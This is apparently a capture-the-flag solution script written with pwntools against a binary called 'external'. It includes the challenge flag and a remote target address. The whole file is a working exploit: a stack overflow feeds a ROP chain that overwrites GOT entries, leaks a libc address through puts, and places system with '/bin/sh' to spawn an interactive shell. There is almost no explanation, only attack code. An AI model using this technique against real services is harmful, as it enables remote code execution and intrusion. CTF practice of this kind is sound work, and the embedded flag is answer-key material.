#Got first blood for this one :p
#flag = flag{0h_nO_My_G0t!!!!1111!1!}
from pwn import *

elf = ELF("./external")
libc = ELF("./libc-2.28.so")

target = process([elf.path], env={"LD_PRELOAD": libc.path})
target = remote('161.97.176.150', 9999)
popRdi = p64(0x00000000004012f3)
popRsiR15 = p64(0x00000000004012f1)
sysret = p64(0x00401283)

target.recvuntil("> ")
payload = "A"*0x58 
payload += popRdi + p64(0) + popRsiR15 + p64(elf.got['puts'])*2 + sysret
payload += popRdi + p64(elf.got['puts']) + p64(elf.plt['puts'] + 6)
payload += popRdi + p64(0) + popRsiR15 + p64(elf.got['puts'])*2 + p64(elf.plt['read'])
payload += popRdi + p64(elf.got['puts'] + 8) + p64(elf.plt['puts'])
print("Payload len: " + hex(len(payload)))
target.send(payload)

gots = ""
gots += p64(elf.plt['puts'] + 6)
gots += "/bin/sh\x00"#p64(elf.plt['setbuf'] + 6)
gots += p64(elf.plt['printf'] + 6)
gots += p64(elf.plt['memset'] + 6)
gots += p64(elf.plt['alarm'] + 6)
gots += p64(elf.plt['read'] + 6)
gots += p64(elf.plt['signal'] + 6)
target.send(gots)

libc_base = u64(target.recvline().strip().ljust(8, "\x00")) - libc.sym['puts']
log.info("LIBC Base: " + hex(libc_base))
target.send(p64(libc_base + libc.sym['system']))

target.interactive()
